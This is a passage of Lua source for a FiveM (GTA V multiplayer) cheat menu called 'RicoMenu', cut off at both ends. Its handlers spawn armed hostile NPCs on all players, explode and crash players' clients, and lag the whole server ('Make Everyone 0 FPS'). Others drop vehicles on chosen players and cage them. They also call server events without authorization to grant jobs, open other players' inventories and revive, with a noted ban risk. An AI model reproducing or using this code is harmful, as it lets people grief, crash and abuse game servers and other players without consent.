                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
		elseif RicoMenu.Button("~y~Spawn ~p~SWAT ~s~all Players 🥷🏻") then
                    local swat = "s_m_y_swat_01"
					local bR = "WEAPON_ASSAULTRIFLE"
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(GetHashKey(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(swat)) then
                            local ped =
                                CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif RicoMenu.Button('~o~Make all Players ~s~UFO 🛸') then
				for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'p_spinning_anus_s'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'p_spinning_anus_s'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
          elseif RicoMenu.Button('~o~Make all Players ~s~WEED 🥦') then 
		  for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'prop_weed_01'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'prop_weed_01'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
			elseif RicoMenu.Button('~o~Make all Players ~s~Windmill 🌀') then
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'prop_windmill_01'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'prop_windmill_01'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
	 elseif RicoMenu.Button('~o~Make all Players ~s~hamburger head 🍔') then
                    local plist = GetActivePlayers()
                        for i = 0, #plist do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
            elseif RicoMenu.Button("~y~Make Everyone 0 FPS (Fuck Server!) 🌎") then
                if not FuckMap then
                    ShowInfo("~r~Fucking Up Map")
                    FuckMap = true
                else
                    ShowInfo("~r~Map Already Fucked")
                end
            elseif RicoMenu.Button("Explode All Players 💥") then
                ExplodeAll(includeself)
            elseif RicoMenu.CheckBox("Explode All Players ☢️ ~r~(LOOP)", ExplodingAll) then
                ExplodingAll = not ExplodingAll
            elseif RicoMenu.Button("Give All Players Weapons") then
                GiveAllPlayersWeapons(includeself)
            elseif RicoMenu.Button("Remove All Players Weapons") then
                StripAll(includeself)
            end

			
			elseif RicoMenu.IsMenuOpened('jobsplayers') then
			if RicoMenu.Button("~r~Remove Job") then
                TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
			elseif RicoMenu.Button("~y~ESX ~b~Police Job") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
                TriggerEvent('esx:setJob', GetPlayerServerId(selectedPlayer), {name = "police", label = "Police", grade = 9, grade_name = "boss", grade_label = "RicoMenu"})
			end
			
			
			elseif RicoMenu.IsMenuOpened('crashtroll') then
			   if RicoMenu.Button('Crash Player FiveM ~r~(Keep 50 meters distance, risk of crash)') then
                    for i = 0, 32 do
                        local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey('ig_wade'))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey('ig_wade')) then
                            local ped =
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                                                                CreatePed(21, GetHashKey('ig_wade'), coords.x, coords.y, coords.z, 0, true, false)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                RequestNetworkControl(ped)
                                GiveWeaponToPed(ped, GetHashKey('WEAPON_RPG'), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, true)
                                makePedHostile(ped, selectedPlayer, 0, 0)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, coords.x, coords.y, coords.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        else
                            Citizen.Wait(0)
                        end
                                        end
										end
			 elseif RicoMenu.IsMenuOpened('troll') then
			 if RicoMenu.Button('~b~God Recalls ~y~Their Car') then
                local veh = "dune4"

                local function spawnVehicleAndPed(selectedPlayer)
                    local target = GetPlayerPed(selectedPlayer)
                    local pos = GetEntityCoords(target)
                    local pitch = GetEntityPitch(target)
                    local roll = GetEntityRoll(target)
                    local yaw = GetEntityRotation(target).z
                    local xf = GetEntityForwardX(target)
                    local yf = GetEntityForwardY(target)
                    local v = nil
                    local ped1 = nil
                
                    RequestModel(veh)
                    RequestModel('a_m_m_genfat_01')
                
                    while not HasModelLoaded(veh) or not HasModelLoaded('a_m_m_genfat_01') do
                        Citizen.Wait(0)
                    end
                
                    if HasModelLoaded(veh) then
                        Citizen.Wait(50)
                        v = CreateVehicle(veh, pos.x - (xf * 1), pos.y - (yf * 1), pos.z, GetEntityHeading(target), true, false)
                        
                        if DoesEntityExist(v) then
                            NetworkRequestControlOfEntity(v)
                            SetVehicleDoorsLocked(v, 4)
                
                            if HasModelLoaded('a_m_m_genfat_01') then
                                Citizen.Wait(50)
                                ped1 = CreatePed(21, GetHashKey('a_m_m_genfat_01'), pos.x, pos.y, pos.z, true, true)
                                
                                if DoesEntityExist(ped1) then
                                    SetPedIntoVehicle(ped1, v, -1)
                                    TaskSetBlockingOfNonTemporaryEvents(ped1, true)
                                    TaskGoToCoordAnyMeans(ped1, GetEntityCoords(target), -1, 9999.0, 1082917029, 0.0, 0, -1)
                                    ApplyForceToEntity(v, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, true, true, 1, 0, 1)
                                    
                                    Citizen.Wait(200)
                                    SetDriverAbility(ped1, 10000.0)
                                    SetDriverAggressiveness(ped1, 10.0)
                                    SetEntityInvincible(ped1, true)
                                    SetEntityVisible(v, false, true)
                                    
                                    Citizen.Wait(400)
                                    DeleteEntity(ped1)
                                    DeleteEntity(v)
                                end
                            end
                        end
                    end
                end
                
                
                local selectedPlayer = 
                spawnVehicleAndPed(selectedPlayer)
			elseif RicoMenu.Button('~g~[NEW] ~w~Fuck Player ~b~Car  ~r~[Attach]') then
                local vehicleName = 'sultan' 

                local function spawnVehicleForPlayer(selectedPlayer)
                    
                    RequestModel(vehicleName)
                
                    
                    while not HasModelLoaded(vehicleName) do
                        Citizen.Wait(500) 
                    end
                
                    
                    local targetPed = GetPlayerPed(selectedPlayer)
                
                    if targetPed and DoesEntityExist(targetPed) then
                        
                        local pos = GetEntityCoords(targetPed)
                        local heading = GetEntityHeading(targetPed)
                
                        
                        local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z - 0.5, heading, true, false) 
                
                        
                        SetEntityAsMissionEntity(vehicle, true, true)
                
                        
                        AttachEntityToEntity(vehicle, targetPed, 0, 0, 0, 0, 0, 0, true, true, false, true, 1, true)
                
                        
                        SetEntityInvincible(vehicle, true)
                        SetEntityVisible(vehicle, false) 
                
                        
                        print("Vehicle spawned and attached to player!")
                    else
                        print("Target player does not exist or is invalid.")
                    end
                end                
                spawnVehicleForPlayer(selectedPlayer)                                                                               
			elseif RicoMenu.Button('~w~Drop ~b~Car ~y~On Player') then
                local car = 'Emperor2'

                local function spawnFallingVehicleForPlayer(selectedPlayer)
                    local vehicleName = car
                    RequestModel(vehicleName)
                
                    while not HasModelLoaded(vehicleName) do
                        Wait(500) 
                    end
                
                    local ped = GetPlayerPed(selectedPlayer)
                    local pos = GetEntityCoords(ped) 
                    local vehicle = CreateVehicle(vehicleName, pos.x + 1, pos.y, pos.z + 10, GetEntityHeading(ped), true, false)
                    
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    
                    
                    
                
                    SetEntityAsNoLongerNeeded(vehicle)
                    SetModelAsNoLongerNeeded(vehicleName)
                end
                
                
                local selectedPlayer = 
                spawnFallingVehicleForPlayer(selectedPlayer)                              
					elseif RicoMenu.Button('~w~Drop ~b~Boat ~y~On Player') then
                        local car = 'marquis'

                        local function spawnFallingVehicleForPlayer(selectedPlayer)
                            local vehicleName = car
                            RequestModel(vehicleName)
                        
                            while not HasModelLoaded(vehicleName) do
                                Wait(500) 
                            end
                        
                            local ped = GetPlayerPed(selectedPlayer)
                            local pos = GetEntityCoords(ped) 
                            local vehicle = CreateVehicle(vehicleName, pos.x + 1, pos.y, pos.z + 10, GetEntityHeading(ped), true, false)
                            
                            ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                            
                            
                            
                        
                            SetEntityAsNoLongerNeeded(vehicle)
                            SetModelAsNoLongerNeeded(vehicleName)
                        end
                        
                        
                        local selectedPlayer = 
                        spawnFallingVehicleForPlayer(selectedPlayer)  
					elseif RicoMenu.Button('~w~Drop ~b~BullDozer ~y~On Player') then
                        local car = 'BullDozer'

                        local function spawnFallingVehicleForPlayer(selectedPlayer)
                            local vehicleName = car
                            RequestModel(vehicleName)
                        
                            while not HasModelLoaded(vehicleName) do
                                Wait(500) 
                            end
                        
                            local ped = GetPlayerPed(selectedPlayer)
                            local pos = GetEntityCoords(ped) 
                            local vehicle = CreateVehicle(vehicleName, pos.x + 1, pos.y, pos.z + 10, GetEntityHeading(ped), true, false)
                            
                            ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                            
                            
                            
                        
                            SetEntityAsNoLongerNeeded(vehicle)
                            SetModelAsNoLongerNeeded(vehicleName)
                        end
                        
                        
                        local selectedPlayer = 
                        spawnFallingVehicleForPlayer(selectedPlayer)                                                                                                                                                                                                                                             
					elseif RicoMenu.Button('~r~Attack ~s~All weapons') then
                    local hamburg = "v_ilev_gc_weapons"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)                    
					elseif RicoMenu.Button('~r~Attack ~s~Box') then
                    local hamburg = "prop_box_wood06a"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif RicoMenu.Button('~r~Attack ~s~ATM') then
                    local hamburg = "prop_atm_01"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif RicoMenu.Button('~r~Attack ~s~Ferris Wheel') then
                    local hamburg = "p_ferris_wheel_amo_l2"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
					elseif RicoMenu.Button('~r~Attack ~s~Weed Plant') then
										local hamburg = "Prop_weed_01"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			 elseif RicoMenu.Button('~r~Attack ~s~Giant Orange') then
										local hamburg = "prop_juicestand"
                                        local hamburghash = GetHashKey(hamburg)
                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                        			AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
							
			elseif RicoMenu.Button('~r~Spawn ~g~Money Player') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('bkr_prop_bkr_cashpile_04'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bkr_prop_bkr_cashpile_04'), 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
			elseif RicoMenu.Button('~b~Spawn ~s~Bumper Car') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('prop_bumper_car_01'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('prop_bumper_car_01'), 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
			elseif RicoMenu.Button('~g~Money Troll ~s~Player') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    local pickup = CreateObject(GetHashKey('bkr_prop_bkr_cashpile_04'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bkr_prop_bkr_cashpile_04'), 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
			 elseif RicoMenu.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e7 = 'prop_fnclink_05crnr1'
                    local e8 = GetHashKey(e7)
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                    SetEntityHeading(e9, -90.0)
                    SetEntityHeading(ea, 90.0)
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
			elseif RicoMenu.Button("~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
			elseif RicoMenu.Button("~r~Spawn ~s~Stripper army with ~y~RGQ") then
                    local bQ = "csb_stripper_02"
					local bR = "weapon_rpg"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
			elseif RicoMenu.Button("Nearby Peds Attack Player") then
                PedAttack(selectedPlayer, PedAttackType)
            elseif RicoMenu.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
                currAttackTypeIndex = currentIndex
                selAttackTypeIndex = currentIndex
                PedAttackType = currentIndex
            end) then
			 elseif RicoMenu.Button("Possess Player Vehicle") then
                if Spectating then SpectatePlayer(selectedPlayer) end
                PossessVehicle(selectedPlayer)
			elseif RicoMenu.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
                Tracking = not Tracking
                TrackedPlayer = selectedPlayer
			elseif RicoMenu.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
				FlingingPlayer = not FlingingPlayer
				FlingedPlayer = selectedPlayer
			elseif RicoMenu.Button("Launch Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")		
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
			elseif RicoMenu.Button("Slam Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")
				else
				
					local wasSpeccing= false
					local tmp = nil
					if Spectating then
						tmp = SpectatedPlayer
						wasSpeccing = true
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					
					if wasSpeccing then
						Spectating = not Spectating
						SpectatePlayer(tmp)
					end
					
				end
			elseif RicoMenu.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
                    currTireIndex = currentIndex
                    selTireIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
					
						local wasSpeccing= false
						local tmp = nil
						if Spectating then
							tmp = SpectatedPlayer
							wasSpeccing = true
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
						RequestControlOnce(veh)
						if selTireIndex == 1 then
							SetVehicleTyreBurst(veh, 0, 1, 1000.0)
						elseif selTireIndex == 2 then
							SetVehicleTyreBurst(veh, 1, 1, 1000.0)
						elseif selTireIndex == 3 then
							SetVehicleTyreBurst(veh, 4, 1, 1000.0)
						elseif selTireIndex == 4 then
							SetVehicleTyreBurst(veh, 5, 1, 1000.0)
						elseif selTireIndex == 5 then
							for i=0,7 do
								SetVehicleTyreBurst(veh, i, 1, 1000.0)
							end
						end
						
						if wasSpeccing then
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end
					
					end
            elseif RicoMenu.Button("Explode Player") then
                ExplodePlayer(selectedPlayer)
			elseif RicoMenu.Button("Silent Kill Player") then
				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
				end
				
				elseif RicoMenu.IsMenuOpened("weaponspawnerplayer") then
                for i = 1, #allweapons do
                    if RicoMenu.Button(allweapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(allweapons[i]), 250, false, true)
                    end
                end
        
        
        -- SPECIFIC PLAYER OPTIONS
        elseif RicoMenu.IsMenuOpened('playeroptions') then
            if RicoMenu.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
			elseif RicoMenu.CheckBox("~g~Spectate ~s~Player", Spectating, "Spectating: ~m~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
				Spectating = not Spectating
				SpectatePlayer(selectedPlayer)
				SpectatedPlayer = selectedPlayer           
			elseif RicoMenu.Button("Teleport To Player") then
				local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
				if string.lower(confirm) == "y" then
					TeleportToPlayer(selectedPlayer)
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif RicoMenu.Button("~y~[QB] ~w~Teleport Player To You!") then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                Citizen.Wait(500)
                TriggerServerEvent("ServerValidEmote", GetPlayerServerId(SelectedPlayer), 'stickupscared')
                for _ = 1,100 do
                    Citizen.Wait(25)
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                end              
			elseif RicoMenu.Button("~w~Open ~b~Inventory") then
                    TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
			elseif RicoMenu.ComboBox("Teleport Into Players Vehicle~h~~r~ »", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
                    currSeatIndex = currentIndex
                    selSeatIndex = currentIndex
                    end) then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
						local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
						if string.lower(confirm) == "y" then
							local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
							if selSeatIndex == 1 then
								if IsVehicleSeatFree(veh, 0) then
									SetPedIntoVehicle(PlayerPedId(), veh, 0)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 2 then
								if IsVehicleSeatFree(veh, 1) then
									SetPedIntoVehicle(PlayerPedId(), veh, 1)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							elseif selSeatIndex == 3 then
								if IsVehicleSeatFree(veh, 2) then
									SetPedIntoVehicle(PlayerPedId(), veh, 2)
								else
									ShowInfo("~r~Seat Taken Or Does Not Exist!")
								end
							end
						end
					end	
			elseif RicoMenu.Button("~r~Kick ~s~From Vehicle") then
                KickFromVeh(selectedPlayer)
			elseif RicoMenu.Button("~y~Steal ~s~Outfit") then
				ClonePed(selectedPlayer)
         ShowInfo("~g~Skin Copied!")
			elseif RicoMenu.Button("~y~ESX ~s~Revive ~r~(RISK)") then
				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
			 if string.lower(confirm) == "y" then
